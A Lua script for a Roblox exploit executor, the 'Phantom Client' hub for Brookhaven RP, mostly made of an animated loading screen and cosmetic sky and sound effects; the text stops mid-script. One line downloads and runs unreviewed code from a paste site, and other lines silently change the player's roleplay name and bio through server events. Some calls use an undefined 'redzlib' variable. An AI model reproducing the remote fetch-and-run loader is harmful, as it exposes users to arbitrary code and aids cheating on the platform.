local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local LoadingConfig = {
    Duration = 8,
    FadeOutTime = 1.5,
    BarColor = Color3.fromRGB(130, 0, 255),
    BarGlow = Color3.fromRGB(190, 60, 255),
    BackgroundColor = Color3.fromRGB(8, 3, 15),
    TextColor = Color3.fromRGB(255, 255, 255),
    ParticleCount = 150,
    ParticleSpeed = 2,
    ParticleSize = 3,
    MusicID = "rbxassetid://1848354536",
    MusicVolume = 0.15,
    MusicStartTime = 1,
    PlayMusic = true
}

local LoadingElements = {
    "Starting system...",
    "Loading interface...",
    "Entre em nosso discord..",
    "Join our Discord..",
    "Loading scripts...",
    "Optimizing performance...",
    "Thank you for running...",
    "Finalizing loading...",
    "Ready to use!"
}

local Particles = {}
local AnimationConnections = {}
local LoadingMusic = nil

local function CreateLoadingMusic()
    if not LoadingConfig.PlayMusic then
        return nil
    end

    local sound = Instance.new("Sound")
    sound.Name = "LoadingMusic"
    sound.SoundId = LoadingConfig.MusicID
    sound.Volume = LoadingConfig.MusicVolume
    sound.Looped = true
    sound.TimePosition = LoadingConfig.MusicStartTime
    sound.Parent = SoundService

    sound:Play()
    LoadingMusic = sound
end

local function FadeOutMusic(duration)
    if LoadingMusic then
        local fadeInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local fadeTween = TweenService:Create(LoadingMusic, fadeInfo, {Volume = 0})
        
        fadeTween:Play()
        fadeTween.Completed:Connect(function()
            if LoadingMusic then
                LoadingMusic:Stop()
                LoadingMusic:Destroy()
                LoadingMusic = nil
            end
        end)
    end
end

local function CreateStarParticle(parent, x, y)
    local star = Instance.new("Frame")
    star.Name = "StarParticle"
    star.Parent = parent
    star.BackgroundColor3 = Color3.fromRGB(100, 0, 200)
    star.BorderSizePixel = 0
    star.Size = UDim2.new(0, math.random(2, LoadingConfig.ParticleSize), 0, math.random(2, LoadingConfig.ParticleSize))
    star.Position = UDim2.new(0, x, 0, y)
    star.ZIndex = 8
    star.BackgroundTransparency = math.random(0, 50) / 100
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = star
    
    local gradient = Instance.new("UIGradient")
    gradient.Parent = star
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(160, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
    })
    
    local particle = {
        frame = star,
        speedX = (math.random(-100, 100) / 100) * LoadingConfig.ParticleSpeed,
        speedY = (math.random(-100, 100) / 100) * LoadingConfig.ParticleSpeed,
        rotationSpeed = math.random(-5, 5),
        pulseSpeed = math.random(1, 3),
        opacity = math.random(30, 100) / 100
    }
    
    return particle
end

local function CreateParticleSystem(parent)
    local screenSize = workspace.CurrentCamera.ViewportSize
    
    for i = 1, LoadingConfig.ParticleCount do
        local x = math.random(0, screenSize.X)
        local y = math.random(0, screenSize.Y)
        local particle = CreateStarParticle(parent, x, y)
        table.insert(Particles, particle)
    end
end

local function UpdateParticles(parentFrame)
    local screenSize = workspace.CurrentCamera.ViewportSize
    
    for _, particle in pairs(Particles) do
        if particle.frame and particle.frame.Parent then
            local currentPos = particle.frame.Position
            local newX = currentPos.X.Offset + particle.speedX
            local newY = currentPos.Y.Offset + particle.speedY
            
            if newX < -10 then
                newX = screenSize.X + 10
            elseif newX > screenSize.X + 10 then
                newX = -10
            end
            
            if newY < -10 then
                newY = screenSize.Y + 10
            elseif newY > screenSize.Y + 10 then
                newY = -10
            end
            
            particle.frame.Position = UDim2.new(0, newX, 0, newY)
            particle.frame.Rotation = particle.frame.Rotation + particle.rotationSpeed
            
            local pulseValue = math.sin(tick() * particle.pulseSpeed) * 0.3 + 0.7
            particle.frame.BackgroundTransparency = 1 - (particle.opacity * pulseValue)
            
            local sizeMultiplier = 1 + (math.sin(tick() * particle.pulseSpeed * 0.5) * 0.2)
            particle.frame.Size = UDim2.new(0, LoadingConfig.ParticleSize * sizeMultiplier, 0, LoadingConfig.ParticleSize * sizeMultiplier)
        end
    end
end

local function CreateAdvancedBackground(parent)
    local bgFrame = Instance.new("Frame")
    bgFrame.Name = "AdvancedBackground"
    bgFrame.Parent = parent
    bgFrame.BackgroundColor3 = Color3.fromRGB(8, 3, 15)
    bgFrame.BorderSizePixel = 0
    bgFrame.Size = UDim2.new(1, 0, 1, 0)
    bgFrame.Position = UDim2.new(0, 0, 0, 0)
    bgFrame.ZIndex = 1
    
    local gradient1 = Instance.new("UIGradient")
    gradient1.Parent = bgFrame
    gradient1.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 0, 90)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(8, 3, 15)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(75, 0, 150)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 3, 15))
    })
    gradient1.Rotation = 45
    
    local animateGradient = TweenService:Create(
        gradient1,
        TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Rotation = 225}
    )
    animateGradient:Play()
    table.insert(AnimationConnections, animateGradient)
    
    local overlay = Instance.new("Frame")
    overlay.Name = "Overlay"
    overlay.Parent = bgFrame
    overlay.BackgroundColor3 = Color3.fromRGB(8, 3, 15)
    overlay.BorderSizePixel = 0
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.Position = UDim2.new(0, 0, 0, 0)
    overlay.ZIndex = 2
    overlay.BackgroundTransparency = 0.3
    
    local overlayGradient = Instance.new("UIGradient")
    overlayGradient.Parent = overlay
    overlayGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 0, 220)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 3, 15)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 20, 255))
    })
    overlayGradient.Rotation = -45
    
    local animateOverlay = TweenService:Create(
        overlayGradient,
        TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Rotation = 315}
    )
    animateOverlay:Play()
    table.insert(AnimationConnections, animateOverlay)
    
    return bgFrame
end

local function CreatePulsingCircles(parent)
    for i = 1, 5 do
        local circle = Instance.new("Frame")
        circle.Name = "PulsingCircle" .. i
        circle.Parent = parent
        circle.BackgroundColor3 = Color3.fromRGB(130, 0, 255)
        circle.BorderSizePixel = 0
        circle.Size = UDim2.new(0, 100 + (i * 50), 0, 100 + (i * 50))
        circle.Position = UDim2.new(0.5, -(50 + (i * 25)), 0.5, -(50 + (i * 25)))
        circle.ZIndex = 3
        circle.BackgroundTransparency = 0.8 + (i * 0.03)
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(1, 0)
        corner.Parent = circle
        
        local pulseTween = TweenService:Create(
            circle,
            TweenInfo.new(2 + (i * 0.3), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
            {
                Size = UDim2.new(0, 120 + (i * 60), 0, 120 + (i * 60)),
                Position = UDim2.new(0.5, -(60 + (i * 30)), 0.5, -(60 + (i * 30))),
                BackgroundTransparency = 0.95
            }
        )
        pulseTween:Play()
        table.insert(AnimationConnections, pulseTween)
    end
end

local function CreateLoadingScreen()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "PremiumLoadingScreen"
    ScreenGui.Parent = PlayerGui
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ScreenInsets = Enum.ScreenInsets.None
    ScreenGui.IgnoreGuiInset = true
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Parent = ScreenGui
    MainFrame.BackgroundColor3 = LoadingConfig.BackgroundColor
    MainFrame.BorderSizePixel = 0
    MainFrame.Size = UDim2.new(1, 0, 1, 0)
    MainFrame.Position = UDim2.new(0, 0, 0, 0)
    MainFrame.ZIndex = 10
    
    local advancedBg = CreateAdvancedBackground(MainFrame)
    CreatePulsingCircles(MainFrame)
    CreateParticleSystem(MainFrame)
    
    local CenterContainer = Instance.new("Frame")
    CenterContainer.Name = "CenterContainer"
    CenterContainer.Parent = MainFrame
    CenterContainer.BackgroundTransparency = 1
    CenterContainer.Size = UDim2.new(0, 600, 0, 400)
    CenterContainer.Position = UDim2.new(0.5, -300, 0.5, -200)
    CenterContainer.ZIndex = 11
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Name = "TitleLabel"
    TitleLabel.Parent = CenterContainer
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Size = UDim2.new(1, 0, 0, 80)
    TitleLabel.Position = UDim2.new(0, 0, 0, 0)
    TitleLabel.Text = "Phantom Client"
    TitleLabel.TextColor3 = LoadingConfig.TextColor
    TitleLabel.TextScaled = true
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.ZIndex = 12
    
    local titleStroke = Instance.new("UIStroke")
    titleStroke.Parent = TitleLabel
    titleStroke.Color = Color3.fromRGB(130, 0, 255)
    titleStroke.Thickness = 2
    titleStroke.Transparency = 0.5
    
    local TitleGradient = Instance.new("UIGradient")
    TitleGradient.Parent = TitleLabel
    TitleGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 0, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(130, 0, 255))
    })
    
    local titleAnimation = TweenService:Create(
        TitleGradient,
        TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Offset = Vector2.new(2, 0)}
    )
    titleAnimation:Play()
    table.insert(AnimationConnections, titleAnimation)
    
    local glowTween = TweenService:Create(
        titleStroke,
        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Transparency = 0.1}
    )
    glowTween:Play()
    table.insert(AnimationConnections, glowTween)
    
    local SubtitleLabel = Instance.new("TextLabel")
    SubtitleLabel.Name = "SubtitleLabel"
    SubtitleLabel.Parent = CenterContainer
    SubtitleLabel.BackgroundTransparency = 1
    SubtitleLabel.Size = UDim2.new(1, 0, 0, 40)
    SubtitleLabel.Position = UDim2.new(0, 0, 0, 90)
    SubtitleLabel.Text = " Loading Phantom Client..."
    SubtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    SubtitleLabel.TextScaled = true
    SubtitleLabel.Font = Enum.Font.Gotham
    SubtitleLabel.ZIndex = 12
    
    local ProgressContainer = Instance.new("Frame")
    ProgressContainer.Name = "ProgressContainer"
    ProgressContainer.Parent = CenterContainer
    ProgressContainer.BackgroundColor3 = Color3.fromRGB(25, 5, 45)
    ProgressContainer.BorderSizePixel = 0
    ProgressContainer.Size = UDim2.new(1, 0, 0, 25)
    ProgressContainer.Position = UDim2.new(0, 0, 0, 160)
    ProgressContainer.ZIndex = 12
    
    local ProgressCorner = Instance.new("UICorner")
    ProgressCorner.CornerRadius = UDim.new(0, 12)
    ProgressCorner.Parent = ProgressContainer
    
    local ProgressStroke = Instance.new("UIStroke")
    ProgressStroke.Parent = ProgressContainer
    ProgressStroke.Color = LoadingConfig.BarGlow
    ProgressStroke.Thickness = 2
    ProgressStroke.Transparency = 0.3
    
    local strokePulse = TweenService:Create(
        ProgressStroke,
        TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Transparency = 0.1}
    )
    strokePulse:Play()
    table.insert(AnimationConnections, strokePulse)
    
    local ProgressBar = Instance.new("Frame")
    ProgressBar.Name = "ProgressBar"
    ProgressBar.Parent = ProgressContainer
    ProgressBar.BackgroundColor3 = LoadingConfig.BarColor
    ProgressBar.BorderSizePixel = 0
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.Position = UDim2.new(0, 0, 0, 0)
    ProgressBar.ZIndex = 13
    
    local BarCorner = Instance.new("UICorner")
    BarCorner.CornerRadius = UDim.new(0, 12)
    BarCorner.Parent = ProgressBar
    
    local BarGradient = Instance.new("UIGradient")
    BarGradient.Parent = ProgressBar
    BarGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, LoadingConfig.BarColor),
        ColorSequenceKeypoint.new(0.5, LoadingConfig.BarGlow),
        ColorSequenceKeypoint.new(1, LoadingConfig.BarColor)
    })
    
    local barGradientAnim = TweenService:Create(
        BarGradient,
        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Offset = Vector2.new(1, 0)}
    )
    barGradientAnim:Play()
    table.insert(AnimationConnections, barGradientAnim)
    
    local GlowEffect = Instance.new("Frame")
    GlowEffect.Name = "GlowEffect"
    GlowEffect.Parent = ProgressBar
    GlowEffect.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    GlowEffect.BackgroundTransparency = 0.6
    GlowEffect.BorderSizePixel = 0
    GlowEffect.Size = UDim2.new(0, 60, 1, 0)
    GlowEffect.Position = UDim2.new(-0.2, 0, 0, 0)
    GlowEffect.ZIndex = 14
    
    local GlowCorner = Instance.new("UICorner")
    GlowCorner.CornerRadius = UDim.new(0, 12)
    GlowCorner.Parent = GlowEffect
    
    local PercentageLabel = Instance.new("TextLabel")
    PercentageLabel.Name = "PercentageLabel"
    PercentageLabel.Parent = CenterContainer
    PercentageLabel.BackgroundTransparency = 1
    PercentageLabel.Size = UDim2.new(1, 0, 0, 40)
    PercentageLabel.Position = UDim2.new(0, 0, 0, 200)
    PercentageLabel.Text = "0%"
    PercentageLabel.TextColor3 = LoadingConfig.BarColor
    PercentageLabel.TextScaled = true
    PercentageLabel.Font = Enum.Font.GothamBold
    PercentageLabel.ZIndex = 12
    
    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Name = "StatusLabel"
    StatusLabel.Parent = CenterContainer
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Size = UDim2.new(1, 0, 0, 30)
    StatusLabel.Position = UDim2.new(0, 0, 0, 250)
    StatusLabel.Text = "Preparando..."
    StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    StatusLabel.TextScaled = true
    StatusLabel.Font = Enum.Font.Gotham
    StatusLabel.ZIndex = 12
    
    local DotsLabel = Instance.new("TextLabel")
    DotsLabel.Name = "DotsLabel"
    DotsLabel.Parent = CenterContainer
    DotsLabel.BackgroundTransparency = 1
    DotsLabel.Size = UDim2.new(0, 60, 0, 30)
    DotsLabel.Position = UDim2.new(1, -60, 0, 250)
    DotsLabel.Text = ""
    DotsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    DotsLabel.TextScaled = true
    DotsLabel.Font = Enum.Font.Gotham
    DotsLabel.ZIndex = 12
    
    return ScreenGui, ProgressBar, PercentageLabel, StatusLabel, DotsLabel, GlowEffect, MainFrame
end

local function AnimateDots(dotsLabel)
    local dots = ""
    local dotCount = 0
    
    spawn(function()
        while dotsLabel.Parent do
            dotCount = (dotCount + 1) % 4
            dots = string.rep(".", dotCount)
            dotsLabel.Text = dots
            wait(0.4)
        end
    end)
end

local function StartLoadingSequence()
    CreateLoadingMusic()
    
    local screenGui, progressBar, percentageLabel, statusLabel, dotsLabel, glowEffect, mainFrame = CreateLoadingScreen()
    
    AnimateDots(dotsLabel)
    
    local particleConnection = RunService.Heartbeat:Connect(function()
        UpdateParticles(mainFrame)
    end)
    table.insert(AnimationConnections, particleConnection)
    
    local glowTween = TweenService:Create(
        glowEffect,
        TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Position = UDim2.new(1.3, 0, 0, 0)}
    )
    glowTween:Play()
    table.insert(AnimationConnections, glowTween)
    
    local startTime = tick()
    local currentElementIndex = 1
    local lastElementTime = startTime
    
    local function updateProgress()
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / LoadingConfig.Duration, 1)
        local percentage = math.floor(progress * 100)
        
        local barTween = TweenService:Create(
            progressBar,
            TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
            {Size = UDim2.new(progress, 0, 1, 0)}
        )
        barTween:Play()
        
        local percentTween = TweenService:Create(
            percentageLabel,
            TweenInfo.new(0.1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
            {TextColor3 = Color3.fromRGB(130 + (percentage * 0.3), 0 + (percentage * 0.2), 255)}
        )
        percentTween:Play()
        
        percentageLabel.Text = percentage .. "%"
        
        local elementTime = LoadingConfig.Duration / #LoadingElements
        if tick() - lastElementTime >= elementTime and currentElementIndex <= #LoadingElements then
            statusLabel.Text = LoadingElements[currentElementIndex]
            
            local statusTween = TweenService:Create(
                statusLabel,
                TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                {TextTransparency = 0}
            )
            statusTween:Play()
            
            currentElementIndex = currentElementIndex + 1
            lastElementTime = tick()
        end
        
        if progress >= 1 then
            wait(0.8)
            
            FadeOutMusic(LoadingConfig.FadeOutTime)
            
            for _, connection in pairs(AnimationConnections) do
                if typeof(connection) == "RBXScriptConnection" then
                    connection:Disconnect()
                elseif typeof(connection) == "Tween" then
                    connection:Cancel()
                end
            end
            
            for _, particle in pairs(Particles) do
                if particle.frame then
                    particle.frame:Destroy()
                end
            end
            
            local fadeOutTween = TweenService:Create(
                mainFrame,
                TweenInfo.new(LoadingConfig.FadeOutTime, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                {
                    BackgroundTransparency = 1,
                    Size = UDim2.new(1.5, 0, 1.5, 0),
                    Position = UDim2.new(-0.25, 0, -0.25, 0)
                }
            )
            
            local contentFadeTween = TweenService:Create(
                mainFrame.CenterContainer,
                TweenInfo.new(LoadingConfig.FadeOutTime * 0.7, Enum.EasingStyle.Back, Enum.EasingDirection.In),
                {
                    Size = UDim2.new(0, 0, 0, 0),
                    Position = UDim2.new(0.5, 0, 0.5, 0)
                }
            )
            
            fadeOutTween:Play()
            contentFadeTween:Play()
            
            fadeOutTween.Completed:Connect(function()
                screenGui:Destroy()
            end)
            
            return
        end
        
        RunService.Heartbeat:Wait()
        updateProgress()
    end
    updateProgress()
end

StartLoadingSequence()

-- ===========================
-- PARTE 2 - HUB FUNCIONAL
-- ===========================

                game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(table.unpack({
                [1] = "RolePlayName",
                [2] = "[ Phantom Client User ]"
                }))
                
                -- Define a bio do jogador
                game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(table.unpack({
                    [1] = "RolePlayBio",
                    [2] = "Criador:The DarknesxzDev",
                }))
              
local Libary = loadstring(game:HttpGet("https://pastefy.app/InU8QgBY/raw"))()

workspace.FallenPartsDestroyHeight = -math.huge

local Window = Libary:MakeWindow({
    Title = "Phantom Client | Brookhaven RP 🏡",
    SubTitle = "By The Darknesxz and Sr_Luiz",
    LoadText = "PhantomClient",
    Flags = "PhantomAsWere"
})

Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://81502956156192", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

task.delay(1, function()
    Window:Dialog({
        Title = "Seja Bem-Vindo(a)",
        Text = "Entre em Nosso Discord Para Mais Atualizacoes.",
        Options = {
            {
                "Discord",
                function()
                    local discordLink = "https://discord.gg/jUQYuUrneP"
                    if setclipboard then
                        setclipboard(discordLink)
                        redzlib:Notify({
                           Title = "Phantom Client",
                            Text = "Link do Discord copiado com sucesso!",
                            Duration = 5
                        })
                    else
                        redzlib:Notify({
                            Title = "Phantom Client",
                            Text = "Seu executor nao permite copiar texto automaticamente.",
                            Duration = 5
                        })
                    end
                end
            },
            {
                "Open",
                function()
                    redzlib:Notify({
                        Title = "Phantom Client",
                        Text = "Phantom Client nunca morre.",
                        Duration = 5
                    })
                end
            }
        }
    })
end)


local InfoTab = Window:MakeTab({ "Informations", "info" })

InfoTab:AddSection({ "Internet Things" })

InfoTab:AddDiscordInvite({
    Name = "Phantom Client | it returned",
    Description = "Esta Afim De conversar e Criar Novas Amizades Entre Na Comunidade da Phantom Client",
    Logo = "rbxassetid://81502956156192",
    Invite = "https://discord.gg/jUQYuUrneP",
})

InfoTab:AddSection({ "Credits" })
InfoTab:AddParagraph({ "Owners", "The Darknesxz & Sr_Luiz" })
InfoTab:AddParagraph({ "Programmers", "The Darknesxz & Sr_Luiz" })
InfoTab:AddParagraph({ "collaborators", "Kakah Dev" })
InfoTab:AddParagraph({ "Hub Parceiro", "Kakah Hub" })

InfoTab:AddSection({ "Informations" })
-- ============================
-- SCRIPT USAGE TIME (Cronômetro)
-- ============================

local tempoTrack = InfoTab:AddParagraph({
    "Script Usage Time:",
    "00:00:00"
})

local tempoAtual = 0

task.spawn(function()
    while true do
        local horas = math.floor(tempoAtual / 3600)
        local minutos = math.floor((tempoAtual % 3600) / 60)
        local segundos = tempoAtual % 60

        local formatado = string.format("%02d:%02d:%02d", horas, minutos, segundos)
        tempoTrack:Set(formatado)

        tempoAtual += 1
        task.wait(1)
    end
end)

InfoTab:AddParagraph({ "You Language:", "Português - Brasil" })

InfoTab:AddParagraph({ "You are Playing:", "Brookhaven RP" })

InfoTab:AddParagraph({ "You are Using:", "Phantom Client" })

InfoTab:AddParagraph({ "You are Using Version:", "7.0" })

InfoTab:AddSection({ "Others" })

InfoTab:AddButton({

    Name = "Rejoin",

    Callback = function()

        local TeleportService = game:GetService("TeleportService")

        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)

    end

})



local ShadersTab = Window:MakeTab({ "Shaders", "server" })



ShadersTab:AddSection({ "Shaders" })



ShadersTab:AddSection({ "Type 1 (Client-Sided)" })

ShadersTab:AddButton({

Name = "Enable Shaders (Irreversible)",

Callback = function()

local workspace = game:GetService("Workspace")

local Lighting = game:GetService("Lighting")

local RunService = game:GetService("RunService")

local Debris = game:GetService("Debris")

local TweenService = game:GetService("TweenService")

local SoundService = game:GetService("SoundService")

local Players = game:GetService("Players")

local player = Players.LocalPlayer

local model = workspace:FindFirstChild("Model")



if model then

    local function setMat(obj)

        for _, c in pairs(obj:GetChildren()) do

            if c:IsA("BasePart") then

                c.Material = Enum.Material.Basalt

            elseif c:IsA("Model") or c:IsA("Folder") then

                setMat(c)

            end

        end

    end

    if model:FindFirstChild("001_SnowStreet") then

        setMat(model["001_SnowStreet"])

    end

    if model:FindFirstChild("Street") then

        for _, o in pairs(model.Street:GetDescendants()) do

            if o:IsA("BasePart") then

                o.Material = Enum.Material.Basalt

            end

        end

    end

    for _, o in pairs(model:GetChildren()) do

        if o:IsA("BasePart") and (o.Name == "Sidewalk" or o.Name == "Wedge") and o.Material == Enum.Material.SmoothPlastic then

            o.Material = Enum.Material.Cobblestone

        end

    end

    model.ChildAdded:Connect(function(obj)

        if obj:IsA("BasePart") and (obj.Name == "Sidewalk" or obj.Name == "Wedge") and obj.Material == Enum.Material.SmoothPlastic then

            obj.Material = Enum.Material.Cobblestone

        end

    end)

end



local soundPart = Instance.new("Part")

soundPart.Size = Vector3.new(1,1,1)

soundPart.Transparency = 1

soundPart.Anchored = true

soundPart.CanCollide = false

soundPart.Parent = workspace

local character = player.Character or player.CharacterAdded:Wait()

local hrp = character:WaitForChild("HumanoidRootPart")



local birdSound = Instance.new("Sound")

birdSound.Name = "BirdsSound"

birdSound.SoundId = "rbxassetid://1237969272"

birdSound.Looped = true

birdSound.Volume = 0.05

birdSound.Parent = soundPart



local wolfSound = Instance.new("Sound")

wolfSound.SoundId = "rbxassetid://6654360741"

wolfSound.Volume = 0.05

wolfSound.Looped = false

wolfSound.Parent = workspace



RunService.Heartbeat:Connect(function()

    if hrp and hrp.Parent then

        soundPart.Position = hrp.Position + Vector3.new(0,10,0)

    end

end)



local function isNight()

    local t = Lighting.ClockTime

    return (t >= 18 or t <= 6)

end



task.spawn(function()

    while true do

        if isNight() then

            if birdSound.IsPlaying then birdSound:Stop() end

            if wolfSound.IsPlaying then wolfSound:Stop() end

            wolfSound:Play()

        else

            if wolfSound.IsPlaying then wolfSound:Stop() end

            if not birdSound.IsPlaying then birdSound:Play() end

        end

        wait(20)

    end

end)



local fountainPart = Instance.new("Part")

fountainPart.Anchored = true

fountainPart.CanCollide = false

fountainPart.Transparency = 1

fountainPart.Size = Vector3.new(1,1,1)

fountainPart.Position = Vector3.new(-27,19,15)

fountainPart.Parent = workspace



local attachment = Instance.new("Attachment")

attachment.Position = Vector3.new(-27,19,15)

attachment.Parent = fountainPart



local fountainSound = Instance.new("Sound")

fountainSound.Name = "FountainSound"

fountainSound.SoundId = "rbxassetid://4766793559"

fountainSound.Looped = true

fountainSound.Volume = 0.03

fountainSound.EmitterSize = 10

fountainSound.RollOffMode = Enum.RollOffMode.Linear

fountainSound.MaxDistance = 100

fountainSound.Parent = attachment

fountainSound:Play()



local customSound = Instance.new("Sound")

customSound.Name = "MyCustomSound"

customSound.SoundId = "rbxassetid://9048659736"

customSound.Volume = 0.01

customSound.Looped = true

customSound.PlayOnRemove = false

customSound.Parent = workspace

customSound:Play()



local active = false

local stars = {}

local shootingStarsFolder = Instance.new("Folder",workspace)

shootingStarsFolder.Name = "ShootingStars"

local STAR_COUNT = 300

local SHOOTING_STAR_CHANCE = 0.3

local SHOOTING_STAR_MAX = 12

local shootingStarCooldown = 0.1



local spaceSound = Instance.new("Sound",workspace)

spaceSound.SoundId = "rbxassetid://1843520836"

spaceSound.Volume = 0.3

spaceSound.Looped = true

spaceSound.Name = "SpaceAmbience"



local function createStar()

    local star = Instance.new("Part")

    local size = math.random(1,3)*0.5

    star.Size = Vector3.new(size,size,size)

    star.Position = Vector3.new(math.random(-1000,1000),math.random(300,700),math.random(-1000,1000))

    star.Anchored = true

    star.CanCollide = false

    star.Material = Enum.Material.Neon

    local colors = {Color3.fromRGB(255,255,255),Color3.fromRGB(255,255,180),Color3.fromRGB(180,200,255)}

    star.Color = colors[math.random(1,#colors)]

    star.Name = "Star"

    star.Parent = workspace

    local light = Instance.new("PointLight",star)

    light.Brightness = 2 + math.random()*1.5

    light.Range = 12

    spawn(function()

        while star.Parent and active do

            star.Transparency = 0.2 + math.sin(tick()*math.random(2,5))*0.2

            RunService.Heartbeat:Wait()

        end

        if star.Parent then star:Destroy() end

    end)

    table.insert(stars,star)

end



local function createShootingStar()

    if not active then return end

    local startPos = Vector3.new(math.random(-1000,1000),math.random(350,600),math.random(-1000,1000))

    local dir = Vector3.new(math.random(-1,1),math.random(-0.1,0.1),math.random(-1,1)).Unit

    local speed = math.random(350,550)

    local isFire = math.random() <= SHOOTING_STAR_CHANCE

    local color = isFire and Color3.fromRGB(255,50,50) or Color3.fromRGB(255,255,220)

    local trailColor = isFire and ColorSequence.new(Color3.fromRGB(255,120,0),Color3.fromRGB(255,230,50)) or ColorSequence.new(Color3.fromRGB(255,255,255),Color3.fromRGB(255,255,180))

    local star = Instance.new("Part")

    star.Size = Vector3.new(0.5,0.5,3)

    star.Position = startPos

    star.Anchored = true

    star.CanCollide = false

    star.Material = Enum.Material.Neon

    star.Color = color

    star.Name = "ShootingStar"

    star.Parent = shootingStarsFolder

    local att0 = Instance.new("Attachment",star)

    local att1 = Instance.new("Attachment",star)

    att1.Position = Vector3.new(0,0,-3)

    local trail = Instance.new("Trail",star)

    trail.Attachment0 = att0

    trail.Attachment1 = att1

    trail.Lifetime = 0.35

    trail.Color = trailColor

    trail.LightEmission = 1

    trail.WidthScale = NumberSequence.new({NumberSequenceKeypoint.new(0,1),NumberSequenceKeypoint.new(1,0)})

    local light = Instance.new("PointLight",star)

    light.Brightness = isFire and 12 or 7

    light.Range = 35

    light.Color = color

    if isFire then

        local fire = Instance.new("Fire",star)

        fire.Heat = 15

        fire.Size = 3.5

        fire.Color = Color3.fromRGB(255,110,0)

        fire.SecondaryColor = Color3.fromRGB(255,210,0)

    end

    local lifetime = math.random(1,1.5)

    local timePassed = 0

    local moveConn

    moveConn = RunService.Heartbeat:Connect(function(dt)

        if not active then moveConn:Disconnect() if star.Parent then star:Destroy() end return end

        timePassed += dt

        if timePassed >= lifetime then moveConn:Disconnect() if star.Parent then star:Destroy() end return end

        local curve = math.sin(timePassed*20)*0.5

        star.Position += (dir+Vector3.new(0,curve,0)).Unit*speed*dt

    end)

    Debris:AddItem(star,4)

end



local function updateSky()

    local hour = Lighting.ClockTime

    local shouldBeActive = hour >= 18 or hour < 6

    if shouldBeActive and not active then

        active = true

        Lighting.FogColor = Color3.fromRGB(10,10,30)

        Lighting.FogEnd = 5000

        Lighting.Brightness = 2

        for _,s in ipairs(stars) do if s and s.Parent then s:Destroy() end end

        stars = {}

        for _,p in ipairs(shootingStarsFolder:GetChildren()) do p:Destroy() end

        for i=1,STAR_COUNT do createStar() end

        spaceSound:Play()

    elseif not shouldBeActive and active then

        active = false

        for _,s in ipairs(stars) do if s and s.Parent then s:Destroy() end end

        stars = {}

        for _,p in ipairs(shootingStarsFolder:GetChildren()) do p:Destroy() end

        spaceSound:Stop()

        Lighting.FogColor = Color3.fromRGB(192,192,192)

        Lighting.FogEnd = 100000

        Lighting.Brightness = 2

    end

end



task.spawn(function()

    while true do

        if active then

            for i=1,SHOOTING_STAR_MAX do

                createShootingStar()

                task.wait(shootingStarCooldown)

            end

        else

            task.wait(1)

        end

    end

end)



task.spawn(function()

    while true do

        updateSky()

        task.wait(1)

    end

end)



local rainFolder = Instance.new("Folder",workspace)

rainFolder.Name = "FakeRain"

